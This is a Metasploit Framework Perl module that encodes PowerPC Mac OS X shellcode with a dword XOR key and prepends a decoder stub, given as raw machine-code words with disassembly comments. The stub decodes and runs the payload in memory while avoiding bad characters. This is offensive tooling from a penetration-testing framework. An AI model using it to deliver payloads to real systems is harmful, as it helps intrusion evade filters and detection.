
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Encoder::OSXPPCLongXOR;
use strict;
use base 'Msf::Encoder';
use Pex::Encoder;
use Pex::Encoding::XorDword;

my $advanced =  {};

my $info = {
    'Name'    => 'MacOS X PPC LongXOR Encoder',
    'Version' => '1.0',
    'Authors' => [ 'Dino Dai Zovi <ddz [at] theta44.org>',
		           'H D Moore <hdm [at] metasploit.com>' ],
    'Arch'    => [ 'ppc' ],
    'OS'      => [ 'osx' ],
    'Description'  =>  "This is ghandi's PPC dword xor decoder with size tweaks by HDM",
    'Refs'    => [ ],
};

sub new {
    my $class = shift; 
    return($class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_));
}

sub EncodePayload {
    my $self     = shift;
    my $payload  = shift;
    my $badchars = shift;

    my $xor_key   = Pex::Encoding::XorDword->KeyScan($payload, $badchars);
    my $xor_data  = Pex::Encoding::XorDword->Encode($xor_key, $payload);

    # Flip the key endian-ness
    $xor_key = unpack('V', pack('N', $xor_key));

    my $encoder = pack("N*", 
	   0x7ca52a79,     # 0x1da8 <main>:          xor.    r5,r5,r5
	   0x4082fffd,     # 0x1dac <main+4>:        bnel+   0x1da8 <main>
	   0x7fe802a6,     # 0x1db0 <main+8>:        mflr    r31
	   0x3bff07fa,     # 0x1db4 <main+12>:       addi    r31,r31,2042
	   0x38a5f84a,     # 0x1db8 <main+16>:       addi    r5,r5,-1974
	   0x3cc09999,     # 0x1dbc <main+20>:       lis     r6, hi16(key)
	   0x60c69999,     # 0x1dc0 <main+24>:       ori     r6,r6, lo16(key)
	   0x388507ba,     # 0x1dc4 <main+28>:       addi    r4,r5,1978
	   0x7c8903a6,     # 0x1dc8 <main+32>:       mtctr   r4
	   0x809ff84a,     # 0x1dcc <main+36>:       lwz     r4,-1974(r31)
	   0x7c843278,     # 0x1dd0 <main+40>:       xor     r4,r4,r6
	   0x909ff84a,     # 0x1dd4 <main+44>:       stw     r4,-1974(r31)
	   0x7c05f8ac,     # 0x1dd8 <main+48>:       dcbf    r5,r31
	   0x7cff04ac,     # 0x1ddc <main+52>:       sync
	   0x7c05ffac,     # 0x1de0 <main+56>:       icbi    r5,r31
	   0x3bc507ba,     # 0x1de4 <main+60>:       addi    r30,r5,1978
	   0x7ffff215,     # 0x1de8 <main+64>:       add.    r31,r31,r30
	   0x4220ffe0,     # 0x1dec <main+68>:       bdnz-   0x1dcc <main+36>
	   0x4cff012c,     # 0x1df0 <main+72>:       isync
	);

	my $icount = (length($payload) / 4);
	
	# patch the payload length
	substr($encoder, 30, 2, pack('n', 1974 + $icount));
	
	# patch the xor key (high and low)
	substr($encoder, 22, 2, substr(pack('N', $xor_key), 0, 2));
	substr($encoder, 26, 2, substr(pack('N', $xor_key), 2, 2));

	if (Pex::Text::BadCharIndex($badchars, $encoder) == -1) {
		return $encoder.$xor_data;
	}

	$self->PrintDebugLine(3, "BadChars found in encoder: ". Pex::Text::BufferPerl($encoder));	
	return;
}

1;